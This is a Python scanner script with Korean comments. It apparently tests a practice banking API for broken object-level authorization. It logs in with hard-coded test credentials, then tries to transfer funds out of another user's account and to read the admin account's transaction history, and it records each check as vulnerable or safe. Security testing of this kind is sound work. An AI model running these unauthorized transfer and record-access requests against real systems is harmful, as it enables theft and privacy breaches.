import requests
from datetime import datetime

def get_token(base_url, username="alice", password="alice1234"):
    resp = requests.post(f"{base_url}/auth/login", json={
        "username": username, "password": password
    })
    if resp.status_code == 200:
        return resp.json()["access_token"]
    raise Exception(f"로그인 실패: {resp.text}")

def bola_check(base_url):
    result = {
        "scan_id": "BOLA",
        "target": base_url,
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "vulnerabilities": []
    }

    try:
        token = get_token(base_url)
    except Exception as e:
        result["error"] = str(e)
        return result

    headers = {"Authorization": f"Bearer {token}"}

    # BOLA-001: 타인 계좌에서 이체 시도 (alice가 bob 계좌에서 출금)
    resp = requests.post(f"{base_url}/transfer",
        json={
            "from_account_id": 2,  # bob 계좌
            "to_account_id": 1,    # alice 계좌
            "amount": 1000,
            "description": "BOLA 테스트"
        },
        headers=headers
    )

    result["vulnerabilities"].append({
        "id": "BOLA-001",
        "type": "BOLA",
        "severity": "Critical",
        "status": "취약" if resp.status_code == 200 else "양호",
        "owasp": "A01:2021 - Broken Access Control",
        "endpoint": "/transfer",
        "payload": "from_account_id=2 (bob 계좌)",
        "detected_keywords": ["Transfer successful"],
        "evidence": resp.text[:200],
        "description": "타인 계좌(bob)에서 본인 계좌(alice)로 무단 이체 성공 — 출금 계좌 소유자 검증 없음"
    })

    # BOLA-002: 거래 내역 무단 조회
    resp2 = requests.get(f"{base_url}/transfer/history",
        params={"account_id": 4},  # admin 계좌
        headers=headers
    )

    result["vulnerabilities"].append({
        "id": "BOLA-002",
        "type": "BOLA",
        "severity": "High",
        "status": "취약" if resp2.status_code == 200 else "양호",
        "owasp": "A01:2021 - Broken Access Control",
        "endpoint": "/transfer/history?account_id=4",
        "payload": "account_id=4 (admin 계좌)",
        "detected_keywords": ["from_account_id", "amount"],
        "evidence": f"admin 거래내역 {len(resp2.json())}건 무단 조회 성공" if resp2.status_code == 200 else "접근 차단",
        "description": "admin 계좌 거래 내역 무단 조회 — account_id 소유자 검증 없음"
    })

    return result